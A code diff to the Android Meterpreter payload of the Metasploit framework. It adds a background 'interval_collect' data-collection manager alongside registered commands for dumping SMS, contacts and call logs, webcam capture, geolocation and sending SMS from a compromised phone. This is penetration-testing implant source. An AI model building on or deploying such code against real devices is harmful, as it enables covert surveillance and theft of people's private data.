@@ -4,13 +4,13 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 
-import com.metasploit.meterpreter.android.wlan_geolocate;
-import com.metasploit.meterpreter.android.send_sms_android;
 import com.metasploit.meterpreter.android.check_root_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
 import com.metasploit.meterpreter.android.dump_sms_android;
 import com.metasploit.meterpreter.android.geolocate_android;
+import com.metasploit.meterpreter.android.interval_collect;
+import com.metasploit.meterpreter.android.send_sms_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
 import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
 import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
@@ -19,6 +19,9 @@ import com.metasploit.meterpreter.android.webcam_get_frame_android;
 import com.metasploit.meterpreter.android.webcam_list_android;
 import com.metasploit.meterpreter.android.webcam_start_android;
 import com.metasploit.meterpreter.android.webcam_stop_android;
+import com.metasploit.meterpreter.android.wlan_geolocate;
+
+import com.metasploit.meterpreter.IntervalCollectionManager;
 
 import com.metasploit.meterpreter.stdapi.Loader;
 import com.metasploit.meterpreter.stdapi.channel_create_stdapi_fs_file;
@@ -55,6 +58,8 @@ public class AndroidMeterpreter extends Meterpreter {
     private static String writeableDir;
     private static Context context;
 
+    private final IntervalCollectionManager intervalCollectionManager;
+
     private void findContext() throws Exception {
         Class<?> activityThreadClass;
         try {
@@ -88,6 +93,10 @@ public class AndroidMeterpreter extends Meterpreter {
         }
     }
 
+    public IntervalCollectionManager getIntervalCollectionManager() {
+        return this.intervalCollectionManager;
+    }
+
     public static Context getContext() {
         return context;
     }
@@ -100,7 +109,11 @@ public class AndroidMeterpreter extends Meterpreter {
         } catch (Exception e) {
             e.printStackTrace();
         }
+
+        this.intervalCollectionManager = new IntervalCollectionManager(getContext());
+        this.intervalCollectionManager.start();
         startExecuting();
+        this.intervalCollectionManager.stop();
     }
 
     @Override
@@ -149,6 +162,7 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("check_root", check_root_android.class);
             mgr.registerCommand("send_sms", send_sms_android.class);
             mgr.registerCommand("wlan_geolocate", wlan_geolocate.class);
+            mgr.registerCommand("interval_collect", interval_collect.class);
         }
         return getCommandManager().getNewCommands();
     }
